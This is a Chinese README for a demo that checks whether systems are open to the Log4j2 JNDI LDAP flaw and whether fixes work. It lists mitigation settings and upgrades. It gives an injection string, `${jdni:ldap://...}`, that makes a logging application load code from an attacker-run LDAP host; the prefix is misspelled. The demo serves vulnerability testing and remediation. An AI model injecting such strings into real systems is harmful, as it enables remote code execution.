## 免责声明
本demo仅用于验证Log4j2 JNDI LDAP漏洞，测试修复方案是否生效使用。非经本人授权造成的网络攻击，与本人无关。

## 使用方式
1. 修改 `gather-result` 项目中默认包下 `Exploit.java` 连接的地址为准备部署 `gather-result` 的IP，并编译放到resources/static 目录下
2. 修改 `light-ldap-server` 常量指向的IP与第一步的IP一致，并启动

### 本地验证
执行 `log4j-local-test` 的 `main` 方法

### 远程验证
调用应用打日志的接口，使替换的变量为 `${jdni:ldap://light-ldap-server部署地址/任意值}`

### 验证结果
验证结果会打印到 `gather-result` 的控制台上

## 修复方案
### 临时修复方案
1. 对于2.0-2.10版本，应先升级至2.10+，再增加jvm参数 `-Dlog4j2.formatMsgNoLookups=true`
2. 修改配置在应用 classpath 下添加 `log4j2.component.properties`配置文件内容如下：
```properties
log4j2.formatMsgNoLookups=true
```
3. 设置系统环境变量 `FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS=true`
4. 自行编译 `log4j-core`
### 长久修复方案
1. 升级当前 2.15.0 官方稳定版本
2. 升级JDK 高于 1.8.191

## 参考
https://github.com/mbechler/marshalsec
https://github.com/lcosmos/apache-log4j-poc